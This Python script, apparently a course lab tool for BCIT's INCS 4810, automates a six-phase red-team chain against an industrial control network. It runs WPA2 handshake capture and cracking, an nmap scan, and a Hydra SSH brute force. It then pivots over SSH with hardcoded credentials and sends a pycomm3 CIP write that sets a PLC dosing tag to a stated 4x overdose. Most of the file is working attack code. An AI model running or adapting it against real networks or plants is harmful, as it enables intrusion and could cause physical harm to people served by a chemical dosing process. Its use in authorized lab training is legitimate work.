#!/usr/bin/env python3


import subprocess
import sys
import os
import time
import json
import argparse
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional

# ── Virtual environment bootstrap ────────────────────────────────────────────
# Re-exec inside ~/attack_script/venv if not already running there.
VENV_DIR    = os.path.expanduser("~/attack_script/venv")
VENV_PYTHON = os.path.join(VENV_DIR, "bin", "python3")
VENV_ACTIVATE = os.path.join(VENV_DIR, "bin", "activate")

def _ensure_venv():
    if not os.path.exists(VENV_PYTHON):
        print("[!] venv not found. Run the following to create it:")
        print(f"    python3 -m venv {VENV_DIR}")
        print(f"    source {VENV_ACTIVATE}")
        print("    pip install rich paramiko pycomm3")
        sys.exit(1)
    # If we're not already running inside the venv, re-exec with venv Python
    if os.path.realpath(sys.executable) != os.path.realpath(VENV_PYTHON):
        os.execv(VENV_PYTHON, [VENV_PYTHON] + sys.argv)

_ensure_venv()

# ── Dependency bootstrap (inside venv) ───────────────────────────────────────
def _require(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[*] Installing {pkg} into venv...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
        return importlib.import_module(name)

_require("rich")
_require("paramiko")
_require("pycomm3")

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.prompt import Confirm, Prompt
from rich.progress import (
    Progress, SpinnerColumn, BarColumn,
    TextColumn, TimeElapsedColumn, TaskProgressColumn
)
from rich.markup import escape
from rich.text import Text
import paramiko

console = Console()

# ── Static config — edit if your lab topology changes ────────────────────────
CFG = {
    "wifi": {
        "interface":    "wlan0",
        "monitor_iface":"wlan0mon",
        "wordlist":     "/usr/share/wordlists/rockyou.txt",
        "capture_file": "/tmp/incs4810_capture",
    },
    "nmap": {
        "idmz_subnet":  "10.10.10.0/24",
        "ports":        "22,80,443,3000,8086,102,44818",
    },
    "historian": {
        "ip":       "10.10.10.20",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "honeypot": {
        "ip": "10.10.10.50",   # Cowrie — never target directly
    },
    "plc": {
        "ip":           "10.20.20.100",
        "tag":          "Dosage_Rate",
        "safe_value":   8,
        "attack_value": 32,
    },
    "hydra": {
        "wordlist": "/usr/share/wordlists/rockyou.txt",
        "threads":  4,
    },
}

# ── Result tracking ───────────────────────────────────────────────────────────
@dataclass
class PhaseResult:
    phase:   str
    status:  str = "pending"   # pending | success | failed | skipped
    output:  str = ""
    finding: str = ""
    ts:      str = field(default_factory=lambda: datetime.now().isoformat())


results: list[PhaseResult] = []

# ── UI helpers ────────────────────────────────────────────────────────────────

ASCII_BANNER = (
    "██╗  ██╗███████╗███╗   ███╗ ██████╗      ██╗      ██████╗  ██████╗██╗  ██╗\n"
    "██║  ██║██╔════╝████╗ ████║██╔═══██╗     ██║     ██╔═══██╗██╔════╝██║ ██╔╝\n"
    "███████║█████╗  ██╔████╔██║██║   ██║     ██║     ██║   ██║██║     █████╔╝ \n"
    "██╔══██║██╔══╝  ██║╚██╔╝██║██║   ██║     ██║     ██║   ██║██║     ██╔═██╗ \n"
    "██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝     ███████╗╚██████╔╝╚██████╗██║  ██╗\n"
    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝      ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n"
    "\n"
    "      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                    \n"
    "     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                    \n"
    "     ███████║   ██║      ██║   ███████║██║     █████╔╝                     \n"
    "     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                     \n"
    "     ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                    \n"
    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                   \n"
)

def banner():
    console.print(f"[bold red]{ASCII_BANNER}[/bold red]")
    console.print(Panel(
        "[bold white]INCS 4810 — Red Team Attack Chain[/bold white]  "
        "[dim]|  BCIT SW01-3550  |  ISA/IEC 62443[/dim]\n"
        "[dim]Instructor: Victor Mendez  "
        f"|  venv: {VENV_DIR}[/dim]\n"
        "[bold yellow]All actions are authorized and confined to the isolated lab network.[/bold yellow]",
        border_style="red",
        expand=False,
    ))


def phase_header(n: int, title: str):
    console.print()
    console.rule(f"[bold cyan]Phase {n}: {title}[/bold cyan]")


def ok(msg: str):
    console.print(f"[bold green] [+][/bold green] [green]{msg}[/green]")


def warn(msg: str):
    console.print(f"[bold yellow] [!][/bold yellow] [yellow]{msg}[/yellow]")


def err(msg: str):
    console.print(f"[bold red] [-][/bold red] [red]{msg}[/red]")


def info(msg: str):
    console.print(f"[bold blue] [*][/bold blue] [blue]{msg}[/blue]")


def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, str]:
    """Run a shell command, return (returncode, stdout+stderr)."""
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    try:
        proc = subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        if capture:
            console.print(f"[dim]{escape(proc.stdout[-2000:])}[/dim]")
        return proc.returncode, proc.stdout
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
    """Open and return an authenticated SSHClient. Raises on failure."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=hostname,
        port=port,
        username=username,
        password=password,
        timeout=15,
    )
    ok(f"SSH connected  {username}@{hostname}:{port}")
    return client


def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str]:
    """Execute a command on an open SSHClient, return (stdout, stderr)."""
    info(f"remote $ {escape(cmd)}")
    _, stdout_ch, stderr_ch = client.exec_command(cmd, timeout=timeout)
    stdout = stdout_ch.read().decode()
    stderr = stderr_ch.read().decode()
    if stdout.strip():
        console.print(f"[dim]{escape(stdout.strip())}[/dim]")
    if stderr.strip():
        console.print(f"[dim red]{escape(stderr.strip())}[/dim red]")
    return stdout, stderr


def confirm_phase(title: str) -> bool:
    return Confirm.ask(f"\n[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)


# ── Phase implementations ─────────────────────────────────────────────────────

def phase1_wifi_crack() -> PhaseResult:
    phase_header(1, "WiFi AP Crack (WPA2 Handshake)")
    r = PhaseResult("WiFi Crack")

    bssid   = Prompt.ask("  Enter AP BSSID  (e.g. AA:BB:CC:DD:EE:FF)")
    channel = Prompt.ask("  Enter AP channel (e.g. 6)")
    cap     = CFG["wifi"]["capture_file"]
    iface   = CFG["wifi"]["interface"]
    mon     = CFG["wifi"]["monitor_iface"]
    wl      = CFG["wifi"]["wordlist"]

    ok("Starting monitor mode...")
    run_cmd("airmon-ng check kill")
    run_cmd(f"airmon-ng start {iface}")

    ok(f"Capturing handshake on ch {channel} (60 s)...")
    warn(f"Run in a second terminal: aireplay-ng --deauth 10 -a {bssid} {mon}")
    run_cmd(
        f"timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {mon}",
        timeout=75
    )

    ok("Cracking handshake with aircrack-ng...")
    rc, out = run_cmd(f"aircrack-ng {cap}-01.cap -w {wl}", timeout=300)

    if "KEY FOUND" in out:
        key_lines = [l for l in out.splitlines() if "KEY FOUND" in l]
        r.finding = key_lines[0] if key_lines else "KEY FOUND"
        r.status  = "success"
        ok(r.finding)
    else:
        r.status  = "failed"
        r.finding = "Handshake not cracked (try larger wordlist)"
        err(r.finding)

    r.output = out[-1000:]
    return r


def phase2_idmz_recon() -> PhaseResult:
    phase_header(2, "IDMZ Recon (nmap)")
    r = PhaseResult("IDMZ Recon")

    subnet = CFG["nmap"]["idmz_subnet"]
    ports  = CFG["nmap"]["ports"]

    rc, out = run_cmd(f"nmap -sV -p {ports} --open {subnet}", timeout=120)

    historian_found = CFG["historian"]["ip"] in out
    honeypot_found  = CFG["honeypot"]["ip"]  in out

    if historian_found:
        ok(f"Historian found at {CFG['historian']['ip']}")
        r.finding = f"Historian ({CFG['historian']['ip']}) reachable"
        r.status  = "success"
    else:
        warn("Historian not found in scan output — check connectivity")
        r.status  = "failed"
        r.finding = "Historian not reachable"

    if honeypot_found:
        warn(f"Cowrie honeypot detected at {CFG['honeypot']['ip']} — DO NOT target this host")

    r.output = out[-2000:]
    return r


def phase3_hydra_brute() -> PhaseResult:
    phase_header(3, "SSH Brute Force on Historian (Hydra)")
    r = PhaseResult("Hydra SSH Brute Force")

    ip   = CFG["historian"]["ip"]
    user = CFG["historian"]["username"]
    wl   = CFG["hydra"]["wordlist"]
    t    = CFG["hydra"]["threads"]

    ok(f"Running Hydra against {ip}:22  (user: {user})")
    rc, out = run_cmd(
        f"hydra -l {user} -P {wl} {ip} ssh -t {t} -V -f",
        timeout=300
    )

    if "login:" in out and "password:" in out:
        cred_lines = [l for l in out.splitlines() if "login:" in l and "password:" in l]
        r.finding  = cred_lines[0] if cred_lines else "Credentials found"
        r.status   = "success"
        ok(r.finding)
    else:
        r.status  = "failed"
        r.finding = "No credentials found with given wordlist"
        err(r.finding)

    r.output = out[-1000:]
    return r


def phase4_ssh_pivot() -> PhaseResult:
    phase_header(4, "SSH into Historian — Lateral Movement Recon")
    r = PhaseResult("SSH Pivot / OT Recon")

    ip       = CFG["historian"]["ip"]
    username = CFG["historian"]["username"]
    password = CFG["historian"]["password"]
    port     = CFG["historian"]["port"]

    try:
        client = ssh_connect(hostname=ip, username=username, password=password, port=port)

        commands = {
            "OT syslog (last 20 lines)": "grep '10.20.20' /var/log/syslog | tail -20",
            "Routes to OT zone":         "ip route | grep 10.20",
            "Ping PLC":                  f"ping -c 3 {CFG['plc']['ip']}",
        }

        findings = []
        for label, cmd in commands.items():
            console.print(f"\n[bold cyan]{label}[/bold cyan]")
            stdout, stderr = ssh_run(client, cmd)
            findings.append(f"{label}:\n{stdout}")

        r.finding = f"OT zone route confirmed; PLC {CFG['plc']['ip']} reachable"
        r.status  = "success"
        r.output  = "\n".join(findings)
        client.close()

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = f"SSH auth failed for {username}@{ip} — update CFG credentials"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def phase5_plc_attack() -> PhaseResult:
    phase_header(5, "CIP Write Tag — PLC Dosage_Rate Manipulation")
    r = PhaseResult("PLC CIP Write")

    plc_ip   = CFG["plc"]["ip"]
    tag      = CFG["plc"]["tag"]
    safe_val = CFG["plc"]["safe_value"]
    atk_val  = CFG["plc"]["attack_value"]

    hist_ip       = CFG["historian"]["ip"]
    hist_port     = CFG["historian"]["port"]
    hist_username = CFG["historian"]["username"]
    hist_password = CFG["historian"]["password"]

    warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on PLC {plc_ip}")
    warn("MasterFlex pump will physically change behavior.")

    if not Confirm.ask("[red]Confirm attack write?[/red]", default=False):
        r.status  = "skipped"
        r.finding = "Skipped by operator"
        return r

    # Payload runs on Historian so CIP traffic originates from 10.10.10.20.
    # source the venv first so pycomm3 is available on the remote host.
    payload = (
        f"source {VENV_ACTIVATE} && python3 - <<'PYEOF'\n"
        f"from pycomm3 import LogixDriver\n"
        f"with LogixDriver('{plc_ip}') as plc:\n"
        f"    cur = plc.read('{tag}')\n"
        f"    print('Before:', cur.value)\n"
        f"    plc.write(('{tag}', {atk_val}))\n"
        f"    after = plc.read('{tag}')\n"
        f"    print('After:', after.value)\n"
        f"PYEOF"
    )

    try:
        client = ssh_connect(
            hostname=hist_ip,
            username=hist_username,
            password=hist_password,
            port=hist_port,
        )
        ok(f"Sending CIP Write via Historian ({hist_ip}) → PLC ({plc_ip})")
        stdout, stderr = ssh_run(client, payload, timeout=30)
        client.close()

        if f"After: {atk_val}" in stdout:
            r.status  = "success"
            r.finding = f"{tag} written: {safe_val} → {atk_val} (4x overdose simulated)"
            ok(r.finding)
        elif "Error" in stderr or "Traceback" in stderr:
            r.status  = "failed"
            r.finding = stderr[:300]
            err(r.finding)
        else:
            r.status  = "success"
            r.finding = f"CIP Write sent — verify tag value on PLC / Grafana"
            warn(r.finding)

        r.output = stdout + stderr

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = f"SSH auth failed for {hist_username}@{hist_ip}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def phase6_defense_check() -> PhaseResult:
    phase_header(6, "Defense Validation (Secure State)")
    r = PhaseResult("Defense Validation")

    ids_ip       = "10.20.20.5"
    ids_username = CFG["historian"]["username"]
    ids_password = CFG["historian"]["password"]
    ids_port     = CFG["historian"]["port"]
    ids_cmd      = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"

    info(f"Checking Suricata alerts on IDS ({ids_ip})...")

    try:
        client = ssh_connect(
            hostname=ids_ip,
            username=ids_username,
            password=ids_password,
            port=ids_port,
        )
        stdout, _ = ssh_run(client, ids_cmd)
        client.close()

        if stdout.strip():
            ok("Suricata CIP alert triggered:")
            console.print(f"[yellow]{escape(stdout)}[/yellow]")
            r.finding = "Suricata blocked CIP Write — Layer 1 defense confirmed"
            r.status  = "success"
        else:
            warn("No Suricata CIP alerts found — check rule deployment")
            r.finding = "No Suricata alerts detected"
            r.status  = "success"

        r.output = stdout

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = f"SSH auth failed for {ids_username}@{ids_ip}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


# ── Final report ──────────────────────────────────────────────────────────────

def print_report():
    console.print()
    console.rule("[bold white]Attack Chain Report[/bold white]")

    STATUS_STYLE = {
        "success": ("green",  " SUCCESS"),
        "failed":  ("red",    " FAILED "),
        "skipped": ("yellow", " SKIPPED"),
        "pending": ("dim",    " PENDING"),
    }

    table = Table(show_header=True, header_style="bold magenta", border_style="dim")
    table.add_column("#",       style="dim",   width=3)
    table.add_column("Phase",   style="cyan",  width=26)
    table.add_column("Status",  width=10)
    table.add_column("Finding", width=54)

    for i, r in enumerate(results, 1):
        color, label = STATUS_STYLE.get(r.status, ("white", r.status.upper()))
        table.add_row(
            str(i),
            r.phase,
            f"[bold {color}]{label}[/bold {color}]",
            r.finding,
        )

    console.print(table)

    report_path = f"/tmp/incs4810_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = [
        {"phase": r.phase, "status": r.status,
         "finding": r.finding, "ts": r.ts, "output": r.output}
        for r in results
    ]
    with open(report_path, "w") as f:
        json.dump(data, f, indent=2)

    ok(f"Full JSON report saved: {report_path}")


# ── Phase registry ────────────────────────────────────────────────────────────

PHASES = [
    (1, "WiFi AP Crack",         phase1_wifi_crack),
    (2, "IDMZ Recon",            phase2_idmz_recon),
    (3, "SSH Brute Force",       phase3_hydra_brute),
    (4, "SSH Pivot / OT Recon",  phase4_ssh_pivot),
    (5, "PLC CIP Write Attack",  phase5_plc_attack),
    (6, "Defense Validation",    phase6_defense_check),
]


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="INCS 4810 Red Team Chain — BCIT Authorized Lab"
    )
    parser.add_argument(
        "--phases", nargs="*", type=int,
        help="Run specific phases only, e.g. --phases 2 3 4"
    )
    parser.add_argument(
        "--auto", action="store_true",
        help="Skip per-phase confirmation prompts"
    )
    args = parser.parse_args()

    banner()

    selected = set(args.phases) if args.phases else {n for n, _, _ in PHASES}

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=30),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        overall = progress.add_task(
            "Attack Chain", total=len(PHASES)
        )

        for n, title, fn in PHASES:
            progress.update(overall, description=f"Phase {n}: {title}")

            if n not in selected:
                results.append(PhaseResult(title, status="skipped", finding="Not selected"))
                progress.advance(overall)
                continue

            if not args.auto and not confirm_phase(f"Phase {n}: {title}"):
                results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
                progress.advance(overall)
                continue

            r = fn()
            results.append(r)
            progress.advance(overall)

            if r.status == "failed" and not args.auto:
                if not Confirm.ask("[red]Phase failed — continue to next phase?[/red]", default=True):
                    break

        progress.update(overall, description="[green]Complete[/green]")

    print_report()


if __name__ == "__main__":
    main()
